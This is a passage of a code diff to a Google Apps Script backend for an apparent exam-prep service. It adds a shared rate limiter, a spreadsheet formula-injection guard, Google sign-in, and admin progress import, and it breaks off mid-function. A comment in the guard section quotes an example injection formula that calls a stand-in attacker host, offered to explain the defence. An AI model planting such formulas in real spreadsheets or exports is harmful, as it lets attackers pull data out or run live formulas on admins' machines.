@@ -101,31 +101,46 @@ function clearLoginLock_(kind, username) {
    but low enough to blunt a bulk-scraping script. */
 const GETFILE_RATE_LIMIT_PER_MINUTE = 120;
 
-function checkGetFileRateLimit_() {
+/* ── SHARED FIXED-WINDOW RATE LIMITER ─────────────────────────────
+   One counter helper backing every non-login rate limit in this file
+   (login lockouts are a different mechanism — see checkLoginLock_
+   above, which tracks failed attempts rather than raw call volume).
+   `bucket` is any string key you want counted independently (e.g.
+   "getfile", "signup", or a per-username key like
+   "submitpayment_alice"); windowMs sizes the fixed window a bucket
+   resets on. When logLabel is given, the FIRST rejection in a given
+   window writes one Activity Log entry — a sustained abuse pattern
+   would otherwise generate one log row per rejected request
+   (potentially hundreds/minute), flooding the Logs sheet; one entry
+   per window is enough to make the pattern visible without that cost.
+   logAction_ is already best-effort/never-throws, so this can't break
+   the rate limit check itself if logging fails. Previously
+   getFile/signup each had their own near-identical copy of this exact
+   bucket/count/logged pattern — consolidated here so a future caller
+   (like submitPayment's per-account throttle below) doesn't need a
+   fourth copy. */
+function checkRateLimit_(bucket, maxCount, windowMs, logLabel) {
   const props = PropertiesService.getScriptProperties();
-  const key = "getfile_rl";
-  const bucket = Math.floor(Date.now() / 60000); // one 60-second window
-  let state = { bucket, count: 0, logged: false };
+  const key = "ratelimit_" + bucket;
+  const windowBucket = Math.floor(Date.now() / windowMs);
+  let state = { windowBucket, count: 0, logged: false };
   const raw = props.getProperty(key);
   if (raw) {
     try { state = JSON.parse(raw); } catch (e) {}
-    if (state.bucket !== bucket) state = { bucket, count: 0, logged: false }; // new window — reset
+    if (state.windowBucket !== windowBucket) state = { windowBucket, count: 0, logged: false }; // window elapsed — reset
   }
   state.count = (state.count || 0) + 1;
-  const withinLimit = state.count <= GETFILE_RATE_LIMIT_PER_MINUTE;
-  // Log the FIRST rejection per minute-bucket only — a sustained
-  // scraping attempt would otherwise generate one log row per rejected
-  // request (potentially hundreds/minute), which would itself flood the
-  // Logs sheet and bury everything else in it. One entry per minute is
-  // enough to make the pattern visible in Activity Logs without that
-  // cost. logAction_ is already best-effort/never-throws, so this can't
-  // break the rate limit check itself if logging fails.
-  if (!withinLimit && !state.logged) {
+  const withinLimit = state.count <= maxCount;
+  if (!withinLimit && logLabel && !state.logged) {
     state.logged = true;
-    logAction_("system", "GetFile Rate Limited", "", "Exceeded " + GETFILE_RATE_LIMIT_PER_MINUTE + " req/min — possible scraping. Further rejections this minute are not individually logged.");
+    logAction_("system", logLabel, "", "Exceeded " + maxCount + " per " + Math.round(windowMs / 1000) + "s (bucket: " + bucket + "). Further rejections this window are not individually logged.");
   }
   props.setProperty(key, JSON.stringify(state));
   return withinLimit;
+}
+
+function checkGetFileRateLimit_() {
+  return checkRateLimit_("getfile", GETFILE_RATE_LIMIT_PER_MINUTE, 60000, "GetFile Rate Limited");
 }
 
 /* ── SIGNUP RATE LIMIT ────────────────────────────────────────────
@@ -147,23 +162,35 @@ function checkGetFileRateLimit_() {
 const SIGNUP_RATE_LIMIT_PER_MINUTE = 15;
 
 function checkSignupRateLimit_() {
-  const props = PropertiesService.getScriptProperties();
-  const key = "signup_rl";
-  const bucket = Math.floor(Date.now() / 60000);
-  let state = { bucket, count: 0, logged: false };
-  const raw = props.getProperty(key);
-  if (raw) {
-    try { state = JSON.parse(raw); } catch (e) {}
-    if (state.bucket !== bucket) state = { bucket, count: 0, logged: false };
-  }
-  state.count = (state.count || 0) + 1;
-  const withinLimit = state.count <= SIGNUP_RATE_LIMIT_PER_MINUTE;
-  if (!withinLimit && !state.logged) {
-    state.logged = true;
-    logAction_("system", "Signup Rate Limited", "", "Exceeded " + SIGNUP_RATE_LIMIT_PER_MINUTE + " signups/min — possible automated account farming. Further rejections this minute are not individually logged.");
-  }
-  props.setProperty(key, JSON.stringify(state));
-  return withinLimit;
+  return checkRateLimit_("signup", SIGNUP_RATE_LIMIT_PER_MINUTE, 60000, "Signup Rate Limited");
+}
+
+/* ── SHEET / CSV FORMULA-INJECTION GUARD ─────────────────────────
+   Apps Script's setValue()/appendRow() apply the SAME formula parsing
+   as typing into the Sheets UI by hand: a string starting with =, +,
+   -, or @ becomes a live formula the instant the cell is written — no
+   admin action needed beyond having the sheet open. Every field this
+   guards (name, txId, remarks, rejectionReason, and free-typed weekly
+   set / question report fields below) is typed by whoever submits the
+   relevant form, so e.g. a signup "name" of
+   =IMPORTXML("https://evil.example","//a") would otherwise sit in the
+   Users sheet as a live formula the moment an admin looks at it. The
+   same unsanitized values are also what admin.html's CSV export would
+   write out, so this closes both the live-sheet risk and the "open the
+   exported CSV in Excel" risk with one fix at the source.
+
+   Prefixing with a leading apostrophe is the standard mitigation (see
+   OWASP's CSV Injection guidance): Sheets/Excel treat a leading
+   apostrophe as "render as literal text", same as if a human typed it
+   that way to escape an accidental formula. Via the API the apostrophe
+   is stored as a literal character rather than hidden the way the UI
+   hides it on manual entry — so an admin will see e.g. "'=SUM(...)"
+   instead of "=SUM(...)" in that cell. That's intentional: it's inert
+   AND still visibly flags that the input looked malicious, rather than
+   silently rewriting it into something that looks normal. */
+function sanitizeSheetField_(value) {
+  const s = String(value == null ? "" : value);
+  return /^[=+\-@]/.test(s) ? "'" + s : s;
 }
 
 const USER_HEADERS = [
@@ -260,9 +287,11 @@ function doGet(e) {
 
       // ── AUTH ──
       case "login":              result = handleLogin(e.parameter); break;
+      case "googlelogin":        result = handleGoogleLogin(e.parameter); break;
       case "signup":             result = handleSignup(e.parameter); break;
       case "requestpasswordreset": result = requestPasswordReset(e.parameter); break;
       case "resetpassword":      result = resetPassword(e.parameter); break;
+      case "updateownmobile":    result = updateOwnMobile(e.parameter); break;
       case "checksession":       result = checkSession(e.parameter); break;
       case "saveprogress":       result = saveProgress(e.parameter); break;
       case "getprogress":        result = getProgress(e.parameter); break;
@@ -306,11 +335,13 @@ function doGet(e) {
       case "adminlistquestionreports": result = adminListQuestionReports(e.parameter); break;
       case "adminupdatequestionreportstatus": result = adminUpdateQuestionReportStatus(e.parameter); break;
       case "admindeletequestionreport": result = adminDeleteQuestionReport(e.parameter); break;
+      case "adminimportprogress": result = adminImportProgress(e.parameter); break;
+      case "adminimportstatus":  result = adminImportStatus(e.parameter); break;
 
       default:
         result = {
           success: false,
-          error: "Unknown action: '" + action + "'. Valid: ping, login, signup, requestPasswordReset, resetPassword, checkSession, saveProgress, getProgress, savePushToken, listWeeklySets, reportQuestion, submitPayment, getPaymentStatus, getSettings, getFile, adminLogin, adminChangePassword, adminListAdmins, adminCreateAdmin, adminDeleteAdmin, adminListUsers, adminListPayments, adminReviewPayment, adminReviewPaymentsBatch, adminDownloadScreenshot, adminGrantAccess, adminGrantAccessBatch, adminUpdateUser, adminDeleteUser, adminDeleteUsersBatch, adminDeletePayment, adminUpdateSettings, adminUpdateSettingsBatch, adminStats, adminMostMissedQuestions, adminListLogs, adminCreateWeeklySet, adminUploadWeeklySetFile, adminUpdateWeeklySet, adminDeleteWeeklySet, adminListWeeklySets, adminListQuestionReports, adminUpdateQuestionReportStatus, adminDeleteQuestionReport"
+          error: "Unknown action: '" + action + "'. Valid: ping, login, googleLogin, signup, requestPasswordReset, resetPassword, updateOwnMobile, checkSession, saveProgress, getProgress, savePushToken, listWeeklySets, reportQuestion, submitPayment, getPaymentStatus, getSettings, getFile, adminLogin, adminChangePassword, adminListAdmins, adminCreateAdmin, adminDeleteAdmin, adminListUsers, adminListPayments, adminReviewPayment, adminReviewPaymentsBatch, adminDownloadScreenshot, adminGrantAccess, adminGrantAccessBatch, adminUpdateUser, adminDeleteUser, adminDeleteUsersBatch, adminDeletePayment, adminUpdateSettings, adminUpdateSettingsBatch, adminStats, adminMostMissedQuestions, adminListLogs, adminCreateWeeklySet, adminUploadWeeklySetFile, adminUpdateWeeklySet, adminDeleteWeeklySet, adminListWeeklySets, adminListQuestionReports, adminUpdateQuestionReportStatus, adminDeleteQuestionReport, adminImportProgress, adminImportStatus"
         };
     }
   } catch (err) {
@@ -387,6 +418,8 @@ function setup() {
   getPushTokensSheet_();
   getWeeklySetsSheet_();
   getQReportsSheet_();
+  getProgressImportsSheet_();
+  getProgressBackupsSheet_();
   initDefaultSettings_();
   ensurePushTriggers_();
   // Idempotent — guarantees every sheet has the correct text-formatting
@@ -1072,6 +1105,17 @@ function handleLogin(p) {
   if (verify.upgradedHash) {
     sheet.getRange(found.rowIndex, 2).setValue(verify.upgradedHash);
   }
+  return buildLoginResult_(sheet, found);
+}
+
+// Shared by handleLogin() (password path) and handleGoogleLogin() (Google
+// Sign-In path, below) — everything AFTER identity has already been
+// proven one way or another is identical: issue a session token,
+// auto-expire a stale trial, resolve yearly-access expiry, and shape the
+// response by status. Pulling this out means the two auth paths can
+// never quietly drift apart on what "logged in" actually returns.
+function buildLoginResult_(sheet, found) {
+  const row = found.row;
   const sessionToken = issueUserToken_(sheet, found.rowIndex);
 
   let status = row[7];
@@ -1136,6 +1180,158 @@ function handleLogin(p) {
   }
 
   return { success: true, user: user, token: sessionToken };
+}
+
+/* ═══════════════════════════════════════════════════════════════
+   SIGN IN WITH GOOGLE
+   ═══════════════════════════════════════════════════════════════
+
+   index.html renders a "Sign in with Google" button (Google Identity
+   Services). On success, the browser gets back a signed JWT ID token
+   proving the person's Google identity — index.html sends that token
+   here as-is, over HTTPS, and everything below happens server-side:
+
+   1. Verify the token is genuine and really meant for THIS app, by
+      asking Google's own tokeninfo endpoint (no client library needed
+      in Apps Script — this is a plain HTTPS GET). This is the
+      "authorization code / ID token" flow's server leg; the frontend
+      never sees anything it could forge a fake login from.
+   2. Match the verified email to an existing account, or create a new
+      trial account on the spot (Google already verified this person
+      owns the email, so email verification/dedup is inherited for
+      free — this is stronger identity proof than the plain signup
+      form gets).
+   3. Hand back the exact same shape buildLoginResult_() already
+      returns for a password login, so index.html's handleUserAuth()
+      needs zero changes to accept a Google sign-in.
+
+   Google-created accounts get a random, never-typed password hash
+   (see makeSalt_ above) — nobody can log into a Google-linked account
+   with a password, by design, because one was never set. */
+
+// ⚠️ REPLACE with the OAuth 2.0 Web Client ID from Google Cloud Console
+// (APIs & Services → Credentials). Must match the client_id used in
+// index.html's google.accounts.id.initialize({ client_id: ... }) call —
+// this is the "aud" (audience) the token below is checked against, and a
+// mismatch here is a REJECTED login, not a silently-wrong one.
+const GOOGLE_CLIENT_ID = "242226857075-hpkbjoqhlem95fu6vkf712e8ijs33sng.apps.googleusercontent.com";
+
+function handleGoogleLogin(p) {
+  const idToken = String(p.idToken || "").trim();
+  if (!idToken) return { success: false, error: "Missing Google ID token." };
+
+  let payload;
+  try {
+    // Google's tokeninfo endpoint verifies the JWT signature, expiry, and
+    // issuer for us — no crypto library needed in Apps Script. It's rate
+    // limited for high-volume production use, but is the documented,
+    // supported way to verify an ID token server-side without pulling in
+    // Google's JWKS and doing RS256 verification by hand.
+    const resp = UrlFetchApp.fetch(
+      "https://oauth2.googleapis.com/tokeninfo?id_token=" + encodeURIComponent(idToken),
+      { muteHttpExceptions: true }
+    );
+    if (resp.getResponseCode() !== 200) {
+      return { success: false, error: "Google sign-in could not be verified. Please try again." };
+    }
+    payload = JSON.parse(resp.getContentText());
+  } catch (err) {
+    return { success: false, error: "Google sign-in verification failed: " + (err.message || err) };
+  }
+
+  // aud must be OUR client id — otherwise this is a token issued for some
+  // OTHER app that happens to also use Google Sign-In, and accepting it
+  // here would let that app's login vouch for identity on this one.
+  if (!payload.aud || payload.aud !== GOOGLE_CLIENT_ID) {
+    return { success: false, error: "This Google sign-in was not issued for this app." };
+  }
+  if (payload.email_verified !== "true" && payload.email_verified !== true) {
+    return { success: false, error: "Your Google email is not verified. Please verify it with Google first." };
+  }
+  const email = String(payload.email || "").trim().toLowerCase();
+  if (!email) return { success: false, error: "Google did not return an email address." };
+  const name = sanitizeSheetField_(String(payload.name || email.split("@")[0]));
+
+  return withLock_(() => {
+    const sheet = getUsersSheet_();
+    let found = findUserByField_(sheet, 3, email); // email is column 3 (0-indexed)
+
+    if (!found) {
+      // Brand-new account, same trial rules as the manual signup form.
+      // Username is derived from the email's local part, de-duplicated
+      // with a numeric suffix if it's already taken (a person can still
+      // change it from Settings later — nothing here locks it in).
+      let base = email.split("@")[0].replace(/[^a-zA-Z0-9_.-]/g, "").slice(0, 24) || "user";
+      let candidate = base;
+      let n = 1;
+      while (findUserRow_(sheet, candidate)) {
+        candidate = base + n;
+        n++;
+      }
+      const now = new Date();
+      const trialHours = Number(getSettingValue_("trialHours", TRIAL_HOURS)) || TRIAL_HOURS;
+      const trialExpiresAt = new Date(now.getTime() + trialHours * 60 * 60 * 1000);
+      // Random, never-issued-to-anyone password hash — this account can
+      // only ever be entered via Google sign-in unless an admin later sets
+      // a real password from admin.html (adminUpdateUser already supports
+      // that), because nobody will ever know this "password".
+      const salt = makeSalt_();
+      const lockoutProofPassword = Utilities.getUuid() + Utilities.getUuid();
+
+      sheet.appendRow([
+        candidate,
+        salt + ":" + hashPassSalted_(lockoutProofPassword, salt),
+        name,
+        email,
+        "",              // mobile — not collected via Google sign-in; the person can add it via updateOwnMobile before their first payment, since payment review contacts them by phone/email either way
+        email,           // contact
+        "email",         // contactType
+        "trial",         // status
+        now.toISOString(),
+        now.toISOString(),
+        "user",
+        trialExpiresAt.toISOString(),
+        "none",
+        "false"
+      ]);
+      const newRowIndex = sheet.getLastRow();
+      found = { rowIndex: newRowIndex, row: sheet.getRange(newRowIndex, 1, 1, USER_HEADERS.length).getValues()[0] };
+      logAction_("system", "Google Signup", candidate, "email=" + email);
+    }
+
+    return buildLoginResult_(sheet, found);
+  });
+}
+
+/* Self-service mobile update — token-authenticated, for the user's OWN
+   account only (contrast with adminUpdateUser, which is admin-only and
+   can edit anyone). Added mainly for Google Sign-In accounts: those are
+   created with mobile="" (Google doesn't hand us a phone number), and
+   admins contact students by phone for payment review — so a Google
+   user who never sets one is harder to reach if anything about their
+   payment needs a human follow-up. */
+function updateOwnMobile(p) {
+  const username = String(p.username || "").trim();
+  const mobile = String(p.mobile || "").trim();
+  if (!username || !p.token) return { success: false, error: "Not logged in." };
+  if (!/^(98|97|96|99)\d{8}$/.test(mobile)) {
+    return { success: false, error: "Invalid Nepali mobile number. Use 10 digits starting with 98/97/96/99." };
+  }
+
+  return withLock_(() => {
+    const sheet = getUsersSheet_();
+    const found = findUserRow_(sheet, username);
+    if (!found) return { success: false, error: "Account not found." };
+    if (!verifyUserToken_(found, p.token)) {
+      return { success: false, error: "Session expired. Please log in again.", sessionInvalid: true };
+    }
+    // Column 5 = mobile. Don't touch contact/contactType (column 6/7) —
+    // those already point at the email for Google accounts and stay that
+    // way; mobile is purely supplementary contact info here, not a login
+    // identifier.
+    sheet.getRange(found.rowIndex, 5).setValue(mobile);
+    return { success: true, message: "Mobile number saved." };
+  });
 }
 
 /* ═══════════════════════════════════════════════════════════════
@@ -1265,7 +1461,7 @@ function handleSignup(p) {
   }
   const username = String(p.username || "").trim();
   const password = p.password || "";
-  const name = String(p.name || "").trim();
+  const name = sanitizeSheetField_(String(p.name || "").trim());
   const email = String(p.email || "").trim();
   const mobile = String(p.mobile || "").trim();
   const contact = email || mobile;
@@ -1523,11 +1719,11 @@ function getProgress(p) {
 
 function submitPayment(p) {
   const username = String(p.username || "").trim();
-  const name = String(p.name || "").trim();
+  const name = sanitizeSheetField_(String(p.name || "").trim());
   const email = String(p.email || "").trim();
   const mobile = String(p.mobile || "").trim();
-  const txId = String(p.txId || "").trim();
-  const remarks = String(p.remarks || "").trim();
+  const txId = sanitizeSheetField_(String(p.txId || "").trim());
+  const remarks = sanitizeSheetField_(String(p.remarks || "").trim());
   const screenshotData = p.screenshot || "";
 
   if (!username) return { success: false, error: "Username required." };
@@ -1544,6 +1740,17 @@ function submitPayment(p) {
   // payment_pending and mess with their status.
   if (!verifyUserToken_(userFound, p.token)) {
     return { success: false, error: "Session expired. Please log in again.", sessionInvalid: true };
+  }
+
+  // Per-account throttle: a legit user resubmitting after a rejection is
+  // still allowed plenty of room (10 submissions/hour); this exists to
+  // stop one compromised or scripted session from hammering the
+  // Payments sheet, not to slow down a normal retry. Usernames are
+  // already proven above via verifyUserToken_, so — unlike a global
+  // limiter — this genuinely limits one account, not just one claimed
+  // identity.
+  if (!checkRateLimit_("submitpayment_" + username.toLowerCase(), 10, 60 * 60 * 1000)) {
+    return { success: false, error: "Too many payment submissions — please wait a few minutes and try again." };
   }
 
   const currentStatus = userFound.row[7];
@@ -2298,7 +2505,7 @@ function adminReviewPayment(p) {
 
   const username = String(p.username || "").trim();
   const status = String(p.status || "").trim();
-  const rejectionReason = String(p.rejectionReason || "").trim();
+  const rejectionReason = sanitizeSheetField_(String(p.rejectionReason || "").trim());
 
   if (!username || !status) return { success: false, error: "Username and status required." };
   if (!["verified", "rejected", "pending"].includes(status)) {
@@ -2387,7 +2594,7 @@ function adminReviewPaymentsBatch(p) {
   }
 
   const status = String(p.status || "").trim();
-  const rejectionReason = String(p.rejectionReason || "").trim();
+  const rejectionReason = sanitizeSheetField_(String(p.rejectionReason || "").trim());
   if (!["verified", "rejected", "pending"].includes(status)) {
     return { success: false, error: "Status must be verified, rejected, or pending." };
   }
@@ -2602,8 +2809,8 @@ function adminUpdateUser(p) {
     if (!found) return { success: false, error: "User not found." };
 
     const changes = [];
-    if (p.name !== undefined) { sheet.getRange(found.rowIndex, 3).setValue(p.name); changes.push("name"); }
-    if (p.email !== undefined) { sheet.getRange(found.rowIndex, 4).setValue(p.email); changes.push("email"); }
+    if (p.name !== undefined) { sheet.getRange(found.rowIndex, 3).setValue(sanitizeSheetField_(p.name)); changes.push("name"); }
+    if (p.email !== undefined) { sheet.getRange(found.rowIndex, 4).setValue(sanitizeSheetField_(p.email)); changes.push("email"); }
     if (p.mobile !== undefined) { sheet.getRange(found.rowIndex, 5).setValue(p.mobile); changes.push("mobile"); }
     if (p.status !== undefined && p.status !== "") { sheet.getRange(found.rowIndex, 8).setValue(p.status); changes.push("status→" + p.status); }
     if (p.permanentAccess !== undefined) {
@@ -2801,82 +3008,6 @@ function adminStats(p) {
   };
 }
 
-// Aggregates per-question wrong/total attempt counts across EVERY
-// user's synced progress data, to surface which specific questions
-// are tripping students up most often — the single most actionable
-// signal for improving question quality, and previously invisible
-// entirely (per-user wrong-answer data existed, but nothing ever
-// aggregated it across students).
-//
-// Deliberately stays Drive-free: this only reads the Progress sheet
-// and parses each row's already-stored JSON blob, tallying by the
-// question uid string (fileId_index — see normQ() in app.js) without
-// ever resolving what that uid actually IS. Resolving a uid into
-// readable question text requires reading the source Drive file,
-// which is comparatively expensive (network I/O) and only worth
-// doing for the tiny number of TOP results an admin will actually
-// look at — that resolution happens client-side in admin.html,
-// reusing the existing getFile action, once per unique fileId among
-// the top results actually shown.
-//
-// A session's qres[] only exists on sessions recorded after this
-// feature shipped, and each user's sessions array is capped at their
-// most recent 50 — so this is a rolling recent-activity signal, not a
-// complete historical record. Still highly actionable: it reflects
-// what students are struggling with lately, which is exactly the
-// window that matters for deciding what to fix or clarify next.
-function adminMostMissedQuestions(p) {
-  if (!checkAdmin_(p)) return { success: false, error: "Admin auth failed." };
-  const minAttempts = Math.max(1, Number(p.minAttempts) || 3);
-  const limit = Math.min(100, Math.max(1, Number(p.limit) || 30));
-
-  const sheet = getProgressSheet_();
-  const data = sheet.getDataRange().getValues();
-  const tally = {}; // uid -> {wrong, total}
-
-  for (let i = 1; i < data.length; i++) {
-    const raw = data[i][1]; // data column
-    if (!raw) continue;
-    let parsed;
-    try { parsed = JSON.parse(raw); } catch (e) { continue; } // one corrupted row shouldn't kill the whole aggregate
-    const sessions = (parsed && parsed.prog && Array.isArray(parsed.prog.sessions)) ? parsed.prog.sessions : [];
-    sessions.forEach(sess => {
-      if (!Array.isArray(sess.qres)) return;
-      sess.qres.forEach(qr => {
-        if (!qr || !qr.uid) return;
-        if (!tally[qr.uid]) tally[qr.uid] = { wrong: 0, total: 0 };
-        tally[qr.uid].total++;
-        if (!qr.ok) tally[qr.uid].wrong++;
-      });
-    });
-  }
-
-  const results = Object.keys(tally)
-    .map(uid => {
-      const t = tally[uid];
-      // uid = fileId_index — index is always a plain integer with no
-      // extra characters, but Drive fileIds can themselves contain
-      // underscores, so splitting on the FIRST underscore would break.
-      // Matching a trailing _<digits> and treating everything before
-      // it as the fileId is unambiguous regardless of how many
-      // underscores the fileId itself contains.
-      const m = uid.match(/^(.+)_(\d+)$/);
-      return {
-        uid,
-        fileId: m ? m[1] : uid,
-        index: m ? Number(m[2]) : null,
-        wrong: t.wrong,
-        total: t.total,
-        wrongRate: t.total ? Math.round((t.wrong / t.total) * 100) : 0
-      };
-    })
-    .filter(r => r.total >= minAttempts && r.fileId !== 'local') // exclude locally-imported files — no shared fileId to resolve text from
-    .sort((a, b) => b.wrongRate - a.wrongRate || b.total - a.total)
-    .slice(0, limit);
-
-  return { success: true, results, minAttempts };
-}
-
 /* ═══════════════════════════════════════════════════════════════
    WEEKLY SETS — admin uploads a fileId over the weekend, scheduled to
    unlock on a specific date/time (typically the following Wednesday).
@@ -2939,9 +3070,9 @@ function adminCreateWeeklySet(p) {
   const actor = checkAdmin_(p);
   if (!actor) return { success: false, error: "Admin auth failed." };
 
-  const title = String(p.title || "").trim();
+  const title = sanitizeSheetField_(String(p.title || "").trim());
   const fileId = String(p.fileId || "").trim();
-  const chapterLabel = String(p.chapterLabel || "").trim();
+  const chapterLabel = sanitizeSheetField_(String(p.chapterLabel || "").trim());
   const releaseAtRaw = String(p.releaseAt || "").trim();
 
   if (!title) return { success: false, error: "Title required." };
@@ -3126,7 +3257,7 @@ function reportQuestion(p) {
 
   const uid = String(p.uid || "").trim();
   const reason = String(p.reason || "").trim();
-  const note = String(p.note || "").trim().slice(0, 500); // generous but bounded — this is a short note, not a support ticket
+  const note = sanitizeSheetField_(String(p.note || "").trim().slice(0, 500)); // generous but bounded — this is a short note, not a support ticket
   const questionSnapshot = String(p.questionSnapshot || "").trim().slice(0, 1000);
   if (!uid) return { success: false, error: "Missing question reference." };
   if (!["wrong_answer", "unclear", "typo", "other"].includes(reason)) {
@@ -3206,6 +3337,603 @@ function adminDeleteQuestionReport(p) {
   });
 }
 
+/* ═══════════════════════════════════════════════════════════════
+   REPORTING & DEVICE-PROGRESS IMPORT
+   ───────────────────────────────────────────────────────────────
+   Two related admin features:
+   1. adminMostMissedQuestions (below) replaces the earlier bare
+      uid-only tally with level/chapter/book/subtopic filters, a date
+      range, and a unique-student count — falling back gracefully to
+      session-level metadata for older progress records that predate
+      per-question metadata.
+   2. adminImportProgress lets an admin upload a device's exported
+      progress data (preview / merge / replace) with validation, size
+      limits, an audit trail (ProgressImports), and a pre-replace
+      backup (ProgressBackups) so a bad import can be undone.
+
+   IMPORTANT CAVEAT, stated plainly: the filters below only work for
+   attempts whose session/question-result data actually CARRIES
+   level/chapter/book/subtopic. Nothing in this backend currently
+   writes that metadata — saveProgress stores whatever blob app.js
+   sends, as-is. Until app.js's client-side quiz/session recording is
+   updated to attach that metadata to each question result (or at
+   least to each session), most existing progress rows will simply
+   have empty level/chapter/book/subtopic, and a filtered query will
+   return few or no rows even though the underlying attempts exist.
+   The uid-based aggregate (fileId + index) still works today with no
+   client change; the filters are forward-compatible plumbing for once
+   the client is updated, not something this backend alone can backfill. */
+
+const PROGRESS_IMPORTS_SHEET = "ProgressImports";
+const PROGRESS_BACKUPS_SHEET = "ProgressBackups";
+
+const PROGRESS_IMPORT_HEADERS = [
+  "importId", "admin", "mode", "status", "recordsReceived",
+  "recordsAccepted", "recordsSkipped", "errorCount", "createdAt",
+  "completedAt", "details"
+];
+
+const PROGRESS_BACKUP_HEADERS = [
+  "backupId", "importId", "username", "data", "createdAt", "createdBy"
+];
+
+const MAX_IMPORT_BODY_CHARS = 450000;
+const MAX_IMPORT_RECORDS = 500;
+const MAX_IMPORT_DATA_CHARS_PER_USER = 45000; // matches saveProgress's own per-user cap
+const MAX_REPORT_LIMIT = 500;
+const MAX_REPORT_MIN_ATTEMPTS = 1000000;
+
+function getProgressImportsSheet_() {
+  const spreadsheet = getSpreadsheet_();
+  let sheet = spreadsheet.getSheetByName(PROGRESS_IMPORTS_SHEET);
+  if (!sheet) {
+    sheet = spreadsheet.insertSheet(PROGRESS_IMPORTS_SHEET);
+    sheet.appendRow(PROGRESS_IMPORT_HEADERS);
+    applyTableFormat_(sheet, PROGRESS_IMPORT_HEADERS, "#5e35b1", SpreadsheetApp.BandingTheme.PURPLE, 320);
+  }
+  return sheet;
+}
+
+function getProgressBackupsSheet_() {
+  const spreadsheet = getSpreadsheet_();
+  let sheet = spreadsheet.getSheetByName(PROGRESS_BACKUPS_SHEET);
+  if (!sheet) {
+    sheet = spreadsheet.insertSheet(PROGRESS_BACKUPS_SHEET);
+    sheet.appendRow(PROGRESS_BACKUP_HEADERS);
+    applyTableFormat_(sheet, PROGRESS_BACKUP_HEADERS, "#455a64", SpreadsheetApp.BandingTheme.GREY, 320);
+  }
+  return sheet;
+}
+
+function createProgressImportLog_(admin, mode, recordCount) {
+  const importId = Utilities.getUuid();
+  getProgressImportsSheet_().appendRow([
+    importId, admin || "admin", mode || "preview", "started",
+    Number(recordCount) || 0, 0, 0, 0, new Date().toISOString(), "", ""
+  ]);
+  return importId;
+}
+
+function updateProgressImportLog_(importId, status, recordsAccepted, recordsSkipped, errorCount, details) {
+  const sheet = getProgressImportsSheet_();
+  const values = sheet.getDataRange().getValues();
+  for (let i = 1; i < values.length; i++) {
+    if (String(values[i][0]) === String(importId)) {
+      sheet.getRange(i + 1, 4, 1, 8).setValues([[
+        status || "",
+        values[i][4] || 0,
+        Number(recordsAccepted) || 0,
+        Number(recordsSkipped) || 0,
+        Number(errorCount) || 0,
+        values[i][8] || "",
+        new Date().toISOString(),
+        String(details || "").slice(0, 30000)
+      ]]);
+      return;
+    }
+  }
+}
+
+function safeImportString_(value, maxLength) {
+  const result = String(value == null ? "" : value).trim();
+  return (maxLength && result.length > maxLength) ? result.slice(0, maxLength) : result;
+}
+
+function normalizeImportMode_(mode) {
+  const value = String(mode || "preview").trim().toLowerCase();
+  return ["preview", "merge", "replace"].includes(value) ? value : "";
+}
+
+function normalizeImportRecords_(payload) {
+  if (!payload || typeof payload !== "object") return [];
+  if (Array.isArray(payload.records)) return payload.records;
+  if (Array.isArray(payload.users)) return payload.users;
+  if (payload.username && payload.data) return [{ username: payload.username, data: payload.data }];
+  return [];
+}
+
+function parseImportData_(value) {
+  if (value && typeof value === "object") return value;
+  const raw = String(value || "").trim();
+  if (!raw) throw new Error("Progress data is empty.");
+  if (raw.length > MAX_IMPORT_DATA_CHARS_PER_USER) throw new Error("Progress data exceeds the 45,000 character limit.");
+  let parsed;
+  try { parsed = JSON.parse(raw); } catch (e) { throw new Error("Progress data is not valid JSON."); }
+  if (!parsed || typeof parsed !== "object" || Array.isArray(parsed)) throw new Error("Progress data must be a JSON object.");
+  return parsed;
+}
+
+// Same prog/bk/fl/wr/stk shape saveProgress already accepts from the
+// client, validated field-by-field before it's ever written to a sheet —
+// an import (unlike a live client save) is admin-supplied and could come
+// from a hand-edited export, so it gets checked rather than trusted.
+function validateProgressObject_(data) {
+  if (!data || typeof data !== "object" || Array.isArray(data)) {
+    return { valid: false, error: "Progress data must be an object." };
+  }
+  const allowedKeys = { prog: true, bk: true, fl: true, wr: true, stk: true, schemaVersion: true, updatedAt: true };
+  for (const key of Object.keys(data)) {
+    if (!allowedKeys[key]) return { valid: false, error: "Unsupported progress field: " + key };
+  }
+  for (const arrayField of ["bk", "fl", "wr"]) {
+    if (data[arrayField] !== undefined && !Array.isArray(data[arrayField])) {
+      return { valid: false, error: arrayField + " must be an array." };
+    }
+  }
+  if (data.prog !== undefined) {
+    if (!data.prog || typeof data.prog !== "object" || Array.isArray(data.prog)) {
+      return { valid: false, error: "prog must be an object." };
+    }
+    if (data.prog.sessions !== undefined && !Array.isArray(data.prog.sessions)) {
+      return { valid: false, error: "prog.sessions must be an array." };
+    }
+    for (const numericField of ["total", "correct", "studySec"]) {
+      const v = data.prog[numericField];
+      if (v !== undefined && (typeof v !== "number" || !isFinite(v))) {
+        return { valid: false, error: "prog." + numericField + " must be numeric." };
+      }
+    }
+  }
+  return { valid: true };
+}
+
+function serializeProgressObject_(data) {
+  const json = JSON.stringify(data);
+  if (json.length > MAX_IMPORT_DATA_CHARS_PER_USER) throw new Error("Merged progress exceeds the 45,000 character limit.");
+  return json;
+}
+
+function cloneJson_(value) {
+  return JSON.parse(JSON.stringify(value));
+}
+
+function itemUid_(item) {
+  return (item && typeof item === "object") ? String(item.uid || item.id || "").trim() : "";
+}
+
+// Merges two bk/fl/wr-shaped arrays (bookmarks/flags/wrong-answers),
+// de-duplicating by uid — a later entry for the same uid overwrites
+// earlier fields rather than adding a duplicate row.
+function mergeUniqueItemsByUid_(first, second) {
+  const result = [];
+  const seen = {};
+  for (const list of [Array.isArray(first) ? first : [], Array.isArray(second) ? second : []]) {
+    for (const item of list) {
+      if (!item || typeof item !== "object") continue;
+      const uid = itemUid_(item);
+      if (!uid) continue;
+      if (!seen[uid]) {
+        seen[uid] = true;
+        result.push(cloneJson_(item));
+      } else {
+        const idx = result.findIndex(r => itemUid_(r) === uid);
+        if (idx !== -1) result[idx] = Object.assign({}, result[idx], cloneJson_(item));
+      }
+    }
+  }
+  return result;
+}
+
+function sessionIdentity_(session) {
+  if (!session || typeof session !== "object") return "";
+  if (session.id) return String(session.id);
+  return [String(session.at || session.startedAt || ""), String(session.mode || ""), String(session.chapter || ""), String(session.total || 0)].join("|");
+}
+
+function mergeSessions_(first, second) {
+  const result = [];
+  const index = {};
+  for (const list of [Array.isArray(first) ? first : [], Array.isArray(second) ? second : []]) {
+    for (const session of list) {
+      if (!session || typeof session !== "object") continue;
